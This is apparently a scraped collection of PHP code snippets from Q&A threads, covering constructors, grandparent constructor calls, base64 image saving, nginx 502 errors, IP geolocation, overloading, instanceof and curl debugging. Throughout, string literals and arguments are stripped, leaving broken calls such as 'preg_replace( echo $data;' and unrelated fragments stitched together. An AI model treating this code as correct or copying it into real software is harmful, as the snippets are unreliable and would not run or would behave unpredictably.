preg_replace( $data = and so on Text text on multiple lines and with whitespaces $data= preg_replace( echo $data;
<?php $str = "This is a Text \n and so on \t Text text."; $str_length = strlen($str); $str_arr = str_split($str); for ($i = 0; $i < $str_length; $i++) { if (isset($str_arr[$i + 1]) && $str_arr[$i] == && $str_arr[$i] == $str_arr[$i + 1]) { unset($str_arr[$i]); } else { continue; } } echo implode("", $str_arr) ; ?>
class Database { protected $userName; protected $password; protected $dbName; public function __construct ( $UserName, $Password, $DbName ) { $this->userName = $UserName; $this->password = $Password; $this->dbName = $DbName; } } $db = new Database (
class Person { public function __construct() { } } $person = new Person();
class Person { public $name = public function __construct( $name ) { $this->name = $name; } } $person = new Person( "Joe" ); echo $person->name;
include( mycat = new cat; $speak = cat->speak(); echo $speak;
<?php class Person { public $isAlive = true; public $firstname; public $lastname; public $age; public function __construct($firstname, $lastname, $age) { $this->firstname = $firstname; $this->lastname = $lastname; $this->age = $age; } public function greet() { return "Hello, my name is " . $this->firstname . " " . $this->lastname . ". Nice to meet you! :-)"; } } $me = new Person( echo $me->greet(); ?>
class Task { public $title; public $description; public function __construct($title, $description){ $this->title = $title; $this->description = $description; } } $task = new Task( var_dump($task->title, $task->description);
class Person{ private $fname; private $lname; public function __construct($fname,$lname){ $this->fname = $fname; $this->lname = $lname; } } $objPerson1 = new Person(
class Test { function __construct($value1,$value2) { echo "Inside Construct"; echo $this->value1; echo $this->value2; } } // $testObject = new Test(
configure: error: xml2-config not found. Please check your libxml2 installation.
if ($result) { echo $result; } else { echo "Unknown Time"; }
$date = new DateTime(); $result = $date->format( echo $result . "<br>"; $krr = explode( $result = implode("", $krr); echo $result;
define ( define ( define ( define ( define ( define ( define ( define ( define ( define ( define (
$date = new \DateTime(); $string = $date->format(DATE_RFC2822);
list($day,$month,$year,$hour,$min,$sec) = explode("/",date( echo $month.
$start_time = date_create_from_format( $current_date = new DateTime(); $diff = $start_time->diff($current_date); $aa = (string)$diff->format( echo gettype($aa);
class Grandpa { public function __construct() { } } class Papa extends Grandpa { public function __construct() { parent::__construct(); } } class Kiddo extends Papa { public function __construct() { } }
class Grandpa { public function __construct() { } } class Papa extends Grandpa { public function __construct($bypass = false) { if (!$bypass) { } parent::__construct(); } } class Kiddo extends Papa { public function __construct() { $bypassPapa = true; parent::__construct($bypassPapa); } }
class Grandpa { public function __construct() {} } class Papa extends Grandpa { public function __construct() { parent::__construct(); } } class Kiddo extends Papa { public function __construct() { Grandpa::__construct(); } }
<?php class Grandpa { public function __construct(){ $this->GrandpaSetup(); } public function GrandpaSetup(){ $this->prop1 = $this->prop2 = } } class Papa extends Grandpa { public function __construct() { parent::__construct(); $this->prop1 = } } class Kiddo extends Papa { public function __construct() { $this->GrandpaSetup(); } } $kid = new Kiddo(); echo "{$kid->prop1}\n{$kid->prop2}\n";
<?php class Grandpa { public function __construct() { echo "Grandpa } } class Papa extends Grandpa { public function __construct() { echo "Papa parent::__construct(); } } class Kiddo extends Papa { public function __construct() { echo "Kiddo $reflectionMethod = new ReflectionMethod(get_parent_class(get_parent_class($this)), $reflectionMethod->invoke($this); } } $kiddo = new Kiddo(); $papa = new Papa();
class Grandpa { public function __construct() { echo } } class Papa extends Grandpa { public function __construct() { echo parent::__construct(); } } class Kiddo extends Papa { public function __construct() { echo Grandpa::__construct(); } } $instance = new Kiddo;
class Grandpa { public function __construct() { echo Kiddo::hello(); } } class Papa extends Grandpa { public function __construct() { echo parent::__construct(); } } class Kiddo extends Papa { public function __construct() { echo Grandpa::__construct(); } public function hello() { echo } } $instance = new Kiddo;
class Foo { var $f = function __construct() { $this->f = } } class Bar extends Foo { var $f = } class FooBar extends Bar { var $f = function __construct() { call_user_func(array(get_parent_class(get_parent_class($this)), } } $foo = new FooBar(); echo $foo->f;
class Grandpa { public function __construct() { echo $this->one; echo $this->two; } } class Papa extends Grandpa { public function __construct() { parent::__construct(); } } class Kiddo extends Papa { public $one = 1; protected $two = 2; public function __construct() { Grandpa::__construct(); } } new Kiddo();
error_reporting(E_ALL); class GrandPa { public function __construct() { print("construct grandpa<br/>"); $this->grandPaFkt(); } protected function grandPaFkt(){ print(">>do Grandpa<br/>"); } } class Pa extends GrandPa { public function __construct() { parent::__construct(); print("construct Pa <br/>"); } public function paFkt(){ print(">>do Pa <br>"); } } class Child extends Pa { public function __construct() { GrandPa::__construct(); Pa::paFkt(); print("construct Child<br/>"); } } $test=new Child(); $test::paFkt();
protected function call2Granpa() { return parent::__construct(); }
<?php class grand_pa { public function __construct() { echo "Hey I am Grand Pa <br>"; } } class pa_pa extends grand_pa { } class kiddo extends pa_pa { public function __construct() { parent::__construct(); echo "Hey I am a child <br>"; } } new kiddo(); ?>
class Grandpa { public function __construct() { $this->___construct(); } protected function ___construct() { } } class Papa extends Grandpa { public function __construct() { parent::__construct(); } } class Kiddo extends Papa { public function __construct() { parent::___construct(); } }
class Grandpa { public function __construct() { echo"Hello Kiddo"; } } class Papa extends Grandpa { public function __construct() { } public function CallGranddad() { parent::__construct(); } } class Kiddo extends Papa { public function __construct() { } public function needSomethingFromGrandDad { parent::CallGranddad(); } }
var image = Canvas2Image.saveAsPNG(canvas, true); image.id = "canvasimage"; canvas.parentNode.replaceChild(image, canvas); var url = data = $( $.ajax({ type: "POST", url: url, dataType: data: { base64data : data } });
$data = list($type, $data) = explode( list(, $data) = explode( $data = base64_decode($data); file_put_contents(
if (preg_match( $data = substr($data, strpos($data, $type = strtolower($type[1]); if (!in_array($type, [ throw new \Exception( } $data = base64_decode($data); if ($data === false) { throw new \Exception( } } else { throw new \Exception( } file_put_contents("img.{$type}", $data);
$img = $_POST[ $img = str_replace( $img = str_replace( $data = base64_decode($img); file_put_contents(
$data = $source = fopen($data, $destination = fopen( stream_copy_to_stream($source, $destination); fclose($source); fclose($destination);
function base64ToImage($imageData){ $data = list($type, $imageData) = explode( list(,$extension) = explode( list(,$imageData) = explode( $fileName = uniqid(). $imageData = base64_decode($imageData); file_put_contents($fileName, $imageData); }
$img = $_POST[ $img = substr(explode(";",$img)[1], 7); file_put_contents(
$data = $fileBin = file_get_contents($data); $mimeType = mime_content_type($data); if ( file_put_contents( }
$file = $_POST[ $img = str_replace( file_put_contents(
<?php define( $image_parts = explode(";base64,", $_POST[ $image_type_aux = explode("image/", $image_parts[0]); $image_type = $image_type_aux[1]; $image_base64 = base64_decode($image_parts[1]); $file = UPLOAD_DIR . uniqid() . file_put_contents($file, $image_base64); ?>
imagesaver("data:image/jpeg;base64,/9j/4AAQSkZJ"); function imagesaver($image_data){ list($type, $data) = explode( if (preg_match( $data = substr($data, strpos($data, $type = strtolower($type[1]); if (!in_array($type, [ throw new \Exception( } $data = base64_decode($data); if ($data === false) { throw new \Exception( } } else { throw new \Exception( } $fullname = time().$type; if(file_put_contents($fullname, $data)){ $result = $fullname; }else{ $result = "error"; } return $result; }
public function convertBase64ToImage($photo = null, $path = null) { if (!empty($photo)) { $photo = str_replace( $photo = str_replace( $photo = str_replace( $photo = str_replace( $entry = base64_decode($photo); $image = imagecreatefromstring($entry); $fileName = time() . ".jpeg"; $directory = "uploads/customer/" . $fileName; header( if (!empty($path)) { if (file_exists($path)) { unlink($path); } } $saveImage = imagejpeg($image, $directory); imagedestroy($image); if ($saveImage) { return $fileName; } else { return false; } } }
<?php $base64String = "kfezyufgzefhzefjizjfzfzefzefhuze"; $filePath = "/MyProject/public/uploads/img/test.png"; file_put_contents($filePath, base64_decode($base64String)); ?>
http request count is zero while sending response to client
fastcgi_cache_path /var/nginx-cache levels=1:2 keys_zone=WORDPRESS:100m inactive=60m; fastcgi_cache_key "$scheme$request_method$host$request_uri"; fastcgi_cache_use_stale error timeout invalid_header http_500; fastcgi_ignore_headers Cache-Control Expires Set-Cookie; proxy_buffer_size 128k; proxy_buffers 4 256k; proxy_busy_buffers_size 256k; upstream php { server unix:/var/run/php5-fpm.sock; }
if ($request_method = POST) { set $skip_cache 1; } if ($query_string != "") { set $skip_cache 1; } if ($request_uri ~* "/wp-admin/|/xmlrpc.php|wp-.*.php|/feed/|index.php|sitemap(_index)?.xml") { set $skip_cache 1; } if ($http_cookie ~* "comment_author|wordpress_[a-f0-9]+|wp-postpass|wordpress_no_cache|wordpress_logged_in") { set $skip_cache 1; } location / { try_files $uri $uri/ /index.php?$args; } location ~ \.php$ { try_files $uri /index.php; include fastcgi_params; fastcgi_pass php; fastcgi_read_timeout 3000; fastcgi_cache_bypass $skip_cache; fastcgi_no_cache $skip_cache; fastcgi_cache WORDPRESS; fastcgi_cache_valid 60m; } location ~ /purge(/.*) { fastcgi_cache_purge WORDPRESS "$scheme$request_method$host$1"; }`
http { proxy_buffer_size 128k; proxy_buffers 4 256k; proxy_busy_buffers_size 256k; }
2015/11/23 10:30:02 [error] 32451 PHP message: PHP Notice: Undefined index: Lastname in /srv/www/classes/data_convert.php on line 1090 ... PHP message: PHP Notice: Undefined index: Firstname in /srv/www/classes/data_convert.php on line 1090 PHP message: PHP Notice: Undefined index: Lastname in /srv/www/classes/data_convert.php on line 1090 PHP message: PHP Notice: Undef 2015/11/23 10:30:02 [error] 32451 PHP message: PHP Notice: Undefined index: Firstname
<?php header( ?> <?php header( echo file_get_contents( ?>
fastcgi_buffers 16 16k; fastcgi_buffer_size 32k; proxy_buffer_size 128k; proxy_buffers 4 256k; proxy_busy_buffers_size 256k;
<?php for ($i = 0; $i<$_GET[ error_log(str_pad("a", $_GET[ echo "got here\n";
bash-4.1 size=121 iterations=30 < HTTP/1.1 502 Bad Gateway size=109 iterations=33 < HTTP/1.1 502 Bad Gateway size=232 iterations=33 < HTTP/1.1 502 Bad Gateway size=241 iterations=48 < HTTP/1.1 502 Bad Gateway size=145 iterations=51 < HTTP/1.1 502 Bad Gateway size=226 iterations=51 < HTTP/1.1 502 Bad Gateway size=190 iterations=60 < HTTP/1.1 502 Bad Gateway size=115 iterations=63 < HTTP/1.1 502 Bad Gateway size=109 iterations=66 < HTTP/1.1 502 Bad Gateway size=163 iterations=69 < HTTP/1.1 502 Bad Gateway [... there would be more here, but I piped through head ...]
bash-4.1 size=223 iterations=69 < HTTP/1.1 502 Bad Gateway size=184 iterations=165 < HTTP/1.1 502 Bad Gateway size=151 iterations=198 < HTTP/1.1 502 Bad Gateway
$ curl ipinfo.io/8.8.8.8 { "ip": "8.8.8.8", "hostname": "google-public-dns-a.google.com", "loc": "37.385999999999996,-122.0838", "org": "AS15169 Google Inc.", "city": "Mountain View", "region": "CA", "country": "US", "phone": 650 }
$ip = $_SERVER[ $details = json_decode(file_get_contents("http: echo $details->city;
{ "ip": "77.99.179.98", "country_code": "GB", "country_name": "United Kingdom", "region_code": "H9", "region_name": "London, City of", "city": "London", "zipcode": "", "latitude": 51.5142, "longitude": -0.0931, "metro_code": "", "areacode": "" }
<script type="text/javascript" src="http: <script> contry_code = google.loader.ClientLocation.address.country_code city = google.loader.ClientLocation.address.city region = google.loader.ClientLocation.address.region </script>
$opts = array( $context = stream_context_create($opts);
<!DOCTYPE html> <html> <head> <title>Geo City Locator by geoip-db.com</title> </head> <body> <div>Country: <span id="country"></span></div> <div>State: <span id="state"></span></div> <div>City: <span id="city"></span></div> <div>Postal: <span id="postal"></span></div> <div>Latitude: <span id="latitude"></span></div> <div>Longitude: <span id="longitude"></span></div> <div>IP address: <span id="ipv4"></span></div> </body> <script> var country = document.getElementById( var state = document.getElementById( var city = document.getElementById( var postal = document.getElementById( var latitude = document.getElementById( var longitude = document.getElementById( var ip = document.getElementById( function callback(data) { country.innerHTML = data.country_name; state.innerHTML = data.state; city.innerHTML = data.city; postal.innerHTML = data.postal; latitude.innerHTML = data.latitude; longitude.innerHTML = data.longitude; ip.innerHTML = data.IPv4; } var script = document.createElement( script.type = script.src = var h = document.getElementsByTagName( h.parentNode.insertBefore(script, h); </script> </html>
$data = file_get_contents("http: $data = file_get_contents("http:
$details = json_decode(file_get_contents("http: echo $details->city;
$coordinates = explode(",", $details->loc); echo $coordinates[0]; echo $coordinates[1];
$ip_address = getenv( $jsondata = file_get_contents("http: $data = json_decode($jsondata, true); if($data[ echo "City: " . $data[ echo "Time: " . $data[ }
$.getJSON( if(data.meta.code == console.log(data); var city = data.data.city; alert(city); var time = data.data.datetime.date_time_txt; alert(time); } });
php > $ip = php > $details = json_decode(file_get_contents("https: php > echo $details->region; California php > echo $details->city; Mountain View php > echo $details->country_name; United States php > echo $details->latitude; 37.751
function detect_location($ip=NULL, $asArray=FALSE) { if (empty($ip)) { if (!empty($_SERVER[ elseif (!empty($_SERVER[ else { $ip = $_SERVER[ } elseif (!is_string($ip) || strlen($ip) < 1 || $ip == $ip = } $url = $i = 0; $content; $curl_info; while (empty($content) && $i < 5) { $ch = curl_init(); $curl_opt = array( CURLOPT_FOLLOWLOCATION => 1, CURLOPT_HEADER => 0, CURLOPT_RETURNTRANSFER => 1, CURLOPT_URL => $url, CURLOPT_TIMEOUT => 1, CURLOPT_REFERER => ); if (isset($_SERVER[ curl_setopt_array($ch, $curl_opt); $content = curl_exec($ch); if (!is_null($curl_info)) $curl_info = curl_getinfo($ch); curl_close($ch); } $araResp = array(); if (preg_match( if (preg_match( if (preg_match( if (preg_match( if (preg_match( if (preg_match( if (preg_match( if (preg_match( $strResp = ($araResp[ return $asArray ? $araResp : $strResp; }
detect_location(); detect_location( detect_location(NULL, TRUE); detect_location(
<?php $res = file_get_contents( $res = json_decode($res); echo $res->country; echo $res->continent; echo $res->latitude; echo $res->longitude; var_dump($res);
$ipInfo = new DavidePastore\Ipinfo\Ipinfo(); $host = $ipInfo->getFullIpDetails("8.8.8.8"); $city = $host->getCity(); $country = $host->getCountry(); $hostname = $host->getHostname(); $ip = $host->getIp(); $loc = $host->getLoc(); $org = $host->getOrg(); $phone = $host->getPhone(); $region = $host->getRegion();
$(document).ready(function () { $( if ($( alert( return false; } $.getJSON("http: function (result) { alert( console.log(result); }); }); });
$result = json_decode(file_get_contents( var_dump($result);
{ "ip": "64.30.228.118", "country_code": "US", "country_name": "United States", "region_code": "FL", "region_name": "Florida", "city": "Fort Lauderdale", "zip_code": "33309", "time_zone": "America/New_York", "latitude": 26.1882, "longitude": -80.1711, "metro_code": 528, "suspicious_factors": { "is_proxy": false, "is_tor_node": false, "is_spam": false, "is_suspicious": false }
$.getJSON("http: function (data) { alert(data.countryName); alert(data.city); } );
function ip_visitor_country($ip){ $ip_data_in = get_web_page("http: $ip_data = json_decode($ip_data_in[ if(empty($ip_data) || $ip_data_in[ return false; }else{ return $ip_data; } } function get_web_page($url){ $user_agent = $options = array( CURLOPT_CUSTOMREQUEST =>"GET", CURLOPT_POST =>false, CURLOPT_USERAGENT => $user_agent, CURLOPT_RETURNTRANSFER => true, CURLOPT_HEADER => false, CURLOPT_FOLLOWLOCATION => true, CURLOPT_ENCODING => "", CURLOPT_AUTOREFERER => true, CURLOPT_CONNECTTIMEOUT => 120, CURLOPT_TIMEOUT => 120, CURLOPT_MAXREDIRS => 10, ); $ch = curl_init( $url ); curl_setopt_array( $ch, $options ); $content = curl_exec( $ch ); $err = curl_errno( $ch ); $errmsg = curl_error( $ch ); $header = curl_getinfo( $ch ); $httpCode = curl_getinfo( $ch, CURLINFO_HTTP_CODE ); curl_close( $ch ); $header[ $header[ $header[ $header[ return $header; }
Array ( [ip] => 1.1.1.1 [hostname] => No Hostname [city] => [country] => AU [loc] => -27.0000,133.0000 [org] => AS15169 Google Inc. )
SELECT * FROM `ip2location_db5` WHERE IP > ip_from AND IP < ip_to
SELECT * FROM `ip2location_db5` WHERE 16843009 > ip_from AND 16843009 < ip_to;
FROM: 16843008 TO: 16843263 Country code: AU Country: Australia Region: Queensland City: Brisbane Latitude: -27.46794 Longitude: 153.02809
class GeoIPCommand extends CConsoleCommand { public function actionIndex($filename = null) { echo "start".PHP_EOL; $handle = fopen($filename, "r"); $destination = $bad = $badIP = []; $goodIP = []; $destHandle = fopen($destination, $badHandle = fopen($bad, if ($handle) { while (($line = fgets($handle)) !== false) { $result = preg_match( if(!$result) continue; $id = $id_ip[1]; $ip = $id_ip[2]; $ok = false; if(isset($badIP[$ip])) { fputs($badHandle, sprintf( continue; } if(isset($goodIP[$ip])) { fputs($destHandle, sprintf( echo sprintf( continue; } $query = @json_decode(file_get_contents( $city = property_exists($query, $city .= property_exists($query, if($city) { fputs($destHandle, sprintf( echo sprintf( $ok = true; } if(!$ok) { $query = @json_decode(file_get_contents( if($query && $query->status == { $city = property_exists($query, $city .= property_exists($query, if($city) { fputs($destHandle, sprintf( echo sprintf( $ok = true; } } } if(!$ok) { $badIP[$ip] = false; fputs($badHandle, sprintf( echo sprintf( } if($ok) { $goodIP[$ip] = $city; } } fclose($handle); fclose($badHandle); fclose($destHandle); }else{ echo return; } return; } }
./yiic geoip index --filename="./source_id_ip_list.txt"
{"as":"AS15169 Google LLC","city":"Newark","country":"United States","countryCode":"US","isp":"Google Cloud","lat":40.7357,"lon":-74.1724,"org":"Google Cloud","query":"35.188.125.133","region":"NJ","regionName":"New Jersey","status":"success","timezone":"America/New_York","zip":"07175"}
function myFunc() { for ($i = 0; $i < func_num_args(); $i++) { printf("Argument %d: %s\n", $i, func_get_arg($i)); } } myFunc(
class MyClass { public function __call($name, $args) { switch ($name) { case switch (count($args)) { case 1: return call_user_func_array(array($this, case 3: return call_user_func_array(array($this, } case switch (count($args)) { case 0: return $this->anotherFuncWithNoArgs(); case 5: return call_user_func_array(array($this, } } } protected function funcOneWithOneArg($a) { } protected function funcOneWithThreeArgs($a, $b, $c) { } protected function anotherFuncWithNoArgs() { } protected function anotherFuncWithMoreArgs($a, $b, $c, $d, $e) { } }
class ParentClass { function mymethod($arg1 = null, $arg2 = null, $arg3 = null) { if( $arg1 == null && $arg2 == null && $arg3 == null ){ return } else { $str = if( $arg1 != null ) $str .= "arg1 = ".$arg1." <br />"; if( $arg2 != null ) $str .= "arg2 = ".$arg2." <br />"; if( $arg3 != null ) $str .= "arg3 = ".$arg3." <br />"; return $str; } } } $obj = new ParentClass; echo echo $obj->mymethod(); echo echo $obj->mymethod(null, echo echo $obj->mymethod(
function($arg1, $lastname) { if(is_array($arg1)){ $lastname = $arg1[ $firstname = $arg1[ } else { $firstname = $arg1; } ... }
/******************************* * author : hishamdalal@gmail.com * version : 3.8 * create on : 2017-09-17 *****************************/ class Overloadable { static function call($obj, $method, $params=null) { $class = get_class($obj); $suffix_method_name = $method.self::getMethodSuffix($method, $params); if (method_exists($obj, $suffix_method_name)) { return call_user_func_array(array($obj, $suffix_method_name), $params); }else{ throw new Exception( } } static function getMethodSuffix($method, $params_ary=array()) { $c = if(is_array($params_ary)){ foreach($params_ary as $i=>$param){ switch(gettype($param)){ case case case case case case if($param instanceof Closure ){ $c .= }else{ $c .= } break; case case case } } } return $c; } static function &refAccess($var_name) { $r =& $GLOBALS["$var_name"]; return $r; } } class test { private $name = function __call($method, $args) { return Overloadable::call($this, $method, $args); } function func__c(Closure $callback) { pre("func__c(".print_r($callback, 1).");", return $callback($this->name); } } $t = new test; pre($t->func(function($n){ return strtoupper($n);}), function pre($mixed, $title=null, $print=true){ $output = ""; if(empty($mixed)){ $output .= "<div><h3>-->Empty $title<--</h3></div>"; if($print) echo $output; else return $output; } $output .= "<fieldset>"; if($title){$output .= "<legend><h2>$title</h2></legend>";} $output .= $output .= print_r($mixed, 1); $output .= $output .= "</fieldset>"; if($print) echo $output; else return $output; }
---- print_r(Closure) ---- func__c(Closure Object ( [parameter] => Array ( [$n] => ) ) ); ---- Closure ---- TEST-1
<?php /******************************* * author : hishamdalal@gmail.com * version : 3.7 * date : 2014-12-01 *****************************/ class Overloadable { static function call($obj, $method, $params=null) { $suffix_method_name = $method.self::getMethodSuffix($method, $params); if (method_exists($obj, $suffix_method_name)) { return call_user_func_array(array($obj, $suffix_method_name), $params); } else { $class = get_class($obj); throw new Exception( } } static function getMethodSuffix($method, $params_ary=array()) { $c = if( is_array($params_ary) ) { foreach($params_ary as $i=>$param){ switch(gettype($param)){ case case case case case case case case } } } return $c; } static function &refAccess($var_name) { $r =& $GLOBALS["$var_name"]; return $r; } } class test { function __call($method, $args) { return Overloadable::call($this, $method, $args); } function myFunction__() { echo } function myFunction__i($int) { echo } function myFunction__s($string) { echo } function myFunction__so($string, $object) { echo echo print_r($object); echo } function anotherFunction__a($array) { echo $array[0]++; $array[ } function anotherFunction__si($key, $value) { echo $a2 =& Overloadable::refAccess($key); $a2 *= 3; } } $val = 10; class obj { private $x=10; } $t = new test; $t->myFunction(); echo $t->myFunction($val); echo $t->myFunction("hello"); echo $t->myFunction("str", new obj()); /* Output: myFunction(string=str, object=obj) Object: obj Object ( [x:obj:private] => 10 ) */ echo echo echo $t->anotherFunction(array(&$val, echo echo echo $t->anotherFunction( echo echo
/******************************* * author : hishamdalal@gmail.com * version : 3.5 * date : 2014-11-16 *****************************/ class Overloadable { public function __call($method, $params) { $class = get_class($this); $suffix_method_name = $method.$this->getMethodSuffix($method, $params); if (method_exists($this, $suffix_method_name)){ return call_user_func_array(array($this, $suffix_method_name), $params); }else{ throw new Exception( } } function getMethodSuffix($method, $params_ary=array()){ $c = if(is_array($params_ary)){ foreach($params_ary as $i=>$param){ switch(gettype($param)){ case case case case case case case } } } return $c; } function &refAccess($var_name){ $r =& $GLOBALS["$var_name"]; return $r; } } class test extends Overloadable { function myFunction__() { echo "Hi<br>"; } function myFunction__is($a, $s) { echo "$a, $s<br>"; } function myFunction__a($a) { $a[0]++; $a[1]++; } function myFunction__i($b) { $b2 =& $this->refAccess( $b2 *= 3; } function myFunction__ss($a, $b) { $this->refAccess($a)->plus(); $b1 =& $this->refAccess($b); $b1++; $b1++; } function myFunction__oia($a, $b, $ary) { $obj_name = $ary[0]; $val_name = $ary[1]; $a1 =& $this->refAccess($obj_name); $a1->plus(); $b1 =& $this->refAccess($val_name); $b1+= $b; } function welcome(){ echo "Welcome!"; } } class obj { private $v=0; function plus(){ $this->v++; } function result(){ return $this->v; } } $val = 10; $val2 = 10; $obj = new obj(); echo "\$val = $val, \$val2 = $val2, "; echo $t = new test(); echo $t->myFunction(); echo "<hr>"; echo $t->myFunction($val, echo "\$val = $val, \$val2 = $val2<hr>"; echo $t->myFunction($val); echo "\$val = $val, \$val2 = $val2<hr>"; echo $t->myFunction(array(&$val, $val2)); echo "\$val = $val, \$val2 = $val2<hr>"; echo $t->myFunction( echo "\$val = $val, \$val2 = $val2, "; echo echo $t->myFunction($obj, $val, array( echo "\$val = $val, \$val2 = $val2, "; echo echo $t->welcome();
/******************************* * author : hishamdalal@gmail.com * version : 3.1 * date : 2013-04-11 *****************************/ class overloadable { protected $fname = null; protected $fargs = array(); function set($obj, $fname, $args){ $n = $type = $this->getType($args); $n = "\$o = new $obj();\n"; $n .= "if(method_exists(\$o, $n .= "\t\$r = \$o->$fname"."_$type(". $this->getArgsName($args) .");\n"; $n .= "}else{\n\t\$r = null;\n"; $n .= "\ttrigger_error( eval("\$r = $n;"); return $r; } function getType($args) { $argType = array(); foreach($args as $i=>$val) { $argType[$i][] = $this->getSuffix($val, $i) ; } $s = if(is_array($argType)){ foreach($argType as $type){ $s .= implode( } return $s; } return implode( } function getSuffix($byValarg, $i) { if( is_numeric($byValarg) ) { $type = $this->fargs[ } elseif( is_array($byValarg) ) { $type = $this->fargs[ } elseif( is_object($byValarg) ) { $type = $this->fargs[ } elseif( is_resource($byValarg) ) { $type = $this->fargs[ } else { $type = $this->fargs[ } return $type; } function getArgsName($args){ $r = array(); $ary = array_keys($this->fargs); foreach( $ary as $k=>$v){ $r[]= } return implode(", ", $r); } function __call($name, $args){ $this->fargs = array(); return $this->set(get_class($this), $name, $args); } } class test2 extends overloadable { function foo_(){ echo } function foo_S($s){ echo "foo - one string $s"; } function foo_SS($s1, $s2){ echo "foo - tow strings $s1, $s2"; } function foo_SN($s, $n){ echo "foo - string and number $s, $n"; } function foo_A($ary){ print_r($ary); } function foo_AA($ary1, $ary2){ if(is_array($ary1) && is_array($ary2)){ echo "foo - tow arrays"; }else{echo 0;} } function foo_O($obj){ echo "foo - "; print_r($obj); } function hi(){ echo "hi - welcome!"; } } echo $t = new test2(); echo print_r( $t->foo() ); echo print_r( $t->foo( echo print_r( $t->foo( echo print_r( $t->foo( echo print_r( $t->foo( echo print_r( $t->foo(array(4,5,6,7)) ); echo print_r( $t->foo( array(5,6,7), array(8,9,10) ) ); echo print_r( $t->foo($t) ); echo print_r( $t->hi() );
function($arg = NULL) { if ($arg != NULL) { etc. etc. } }
function example(...$args) { count($args); } example(1, 2); example(1, 2, 3, 4, 5, 6, 7);
$args[] = 1; $args[] = 2; $args[] = 3; example(...$args);
<?php class abs { public function volume($arg1=null, $arg2=null, $arg3=null) { if($arg1 == null && $arg2 == null && $arg3 == null) { echo "function has no arguments. <br>"; } else if($arg1 != null && $arg2 != null && $arg3 != null) { $volume=$arg1*$arg2*$arg3; echo "volume of a cuboid ".$volume ."<br>"; } else if($arg1 != null && $arg2 != null) { $area=$arg1*$arg2; echo "area of square = " .$area ."<br>"; } else if($arg1 != null) { $volume=$arg1*$arg1*$arg1; echo "volume of a cube = ".$volume ."<br>"; } } } $obj=new abs(); echo "For no arguments. <br>"; $obj->volume(); echo "For one arguments. <br>"; $obj->volume(3); echo "For two arguments. <br>"; $obj->volume(3,4); echo "For three arguments. <br>"; $obj->volume(3,4,5); ?>
public function query($queryString, $class = null) { $query = $this->dbLink->prepare($queryString); $query->execute(); if (!is_null($class)) { $query->setFetchMode(PDO::FETCH_CLASS, $class); } return $query->fetchAll(); } $Result = $this->query($queryString, "SomeClass"); $Result = $this->query($queryString);
function siteURL() { $protocol = (!empty($_SERVER[ $domainName = $_SERVER[ return $protocol.$domainName; } define(
function siteURL() { $protocol = $domainName = $_SERVER[ return $protocol.$domainName; } define(
$protocol = strtolower(substr($_SERVER["SERVER_PROTOCOL"],0,strpos( $_SERVER["SERVER_PROTOCOL"],
if (isset($_SERVER[ ($_SERVER[ isset($_SERVER[ $_SERVER[ $protocol = } else { $protocol = }
function siteURL() { $protocol = ((!empty($_SERVER[ $_SERVER[ $domainName = $_SERVER[ return $protocol.$domainName; }
if ( ! function_exists( { /** * Is HTTPS? * * Determines if the application is accessed via an encrypted * (HTTPS) connection. * * @return bool */ function is_https() { if ( ! empty($_SERVER[ { return TRUE; } elseif (isset($_SERVER[ { return TRUE; } elseif ( ! empty($_SERVER[ { return TRUE; } return FALSE; } }
$object instanceof $string; $object instanceof $otherObject; $object instanceof ClassName;
Test name Repeats Result Performance instanceof 10000 0.028343 sec +0.00% is_a() 10000 0.043927 sec -54.98%
interface MyInterface { } class MyClass implements MyInterface { } $a = new MyClass; $b = new MyClass; $c = $d = var_dump($a instanceof $b); var_dump($a instanceof $c); var_dump($a instanceof $d);
function method_1($a = null) { return is_object($a) && is_a($a, } function method_2($a = null) { return is_a((object) $a, } function method_3($a = null) { return $a instanceof }
function validate_sms_code() { $state = NOTHING_SUBMITED; if (isset($_POST( $sms_code = clean_up($_POST( $return_code = get_sepomo_code($sms_code); switch($return_code) { case 1: $state = CORRECT_CODE; break; case 2: $state = CODE_ALREADY_USED; break; case 3: $state = WRONG_CODE; break; case 4: $state = UNKNOWN_SEPOMO_CODE; break; default: $state = UNKNOWN_SEPOMO_CODE; throw new Exception( break; } } else { $state = NOTHING_SUBMITED; } dispatch_on_state($state); }
foreach($arr_parameters as $arr_key=>$arr_value) { $arr_named_parameters(":$arr_key") = $arr_value; }
foreach ($comments as $comment) { $user = $DB->get_record( $cmnt .= $cmnt .= $cmnt .= tracker_print_user($user); $cmnt .= $cmnt .= $cmnt .= $cmnt .= if($comment->attachmentid) $attachment= $DB->get_records_sql("SELECT * FROM {files} WHERE filename != $cmnt .= $comment->comment; if(!empty($attachment)) { $out = array(); $fs = get_file_storage(); foreach($attachment as $attachments) { $files = $fs->get_area_files($attachments->contextid, } foreach($files as $file) { $filename = $file->get_filename(); $ctxid = $file->get_contextid(); $component = $file->get_component(); $itemid = $file->get_itemid(); $url = $CFG->wwwroot."/draftfile.php/$ctxid/user/draft/$itemid/$filename"; $out[] = html_writer::link($url, $filename); } $br = html_writer::empty_tag( $cmnt .= implode($br, $out); } $cmnt .= $cmnt .= } }
curl_setopt($handle, CURLOPT_VERBOSE, true); $verbose = fopen( curl_setopt($handle, CURLOPT_STDERR, $verbose);
$result = curl_exec($handle); if ($result === FALSE) { printf("cUrl error ( htmlspecialchars(curl_error($handle))); } rewind($verbose); $verboseLog = stream_get_contents($verbose); echo "Verbose information:\n<pre>", htmlspecialchars($verboseLog), "</pre>\n";
$version = curl_version(); extract(curl_getinfo($handle)); $metrics = <<<EOD URL....: $url Code...: $http_code ($redirect_count redirect(s) in $redirect_time secs) Content: $content_type Size: $download_content_length (Own: $size_download) Filetime: $filetime Time...: $total_time Start @ $starttransfer_time (DNS: $namelookup_time Connect: $connect_time Request: $pretransfer_time) Speed..: Down: $speed_download (avg.) Up: $speed_upload (avg.) Curl...: v{$version[ EOD;
curl_setopt($ch, CURLOPT_VERBOSE, 1); curl_setopt($ch, CURLOPT_STDERR, $fp);
curl_setopt($curl, CURLOPT_VERBOSE, true); curl_setopt($curl, CURLOPT_STDERR, fopen(
$response = curl_exec($ch); $info = curl_getinfo($ch); var_dump($info);
composer create-project --prefer-dist laravel/laravel blog
composer create-project laravel/laravel /path/to/tour/project
switch($str) { case "One": return new ClassOne(); case "Two": return new ClassTwo(); }
$func = $func( $method = $object = new MyClass(); $object->$method();
public function &factory($className) { require_once($className . if(class_exists($className)) return new $className; die( }
public class ClassOne { protected $arg1; protected $arg2; public function __construct($arg1, $arg2) { $this->arg1 = $arg1; $this->arg2 = $arg2; } public function echoArgOne { echo $this->arg1; } }
$str = "One"; $className = "Class".$str; $class = new \ReflectionClass($className);
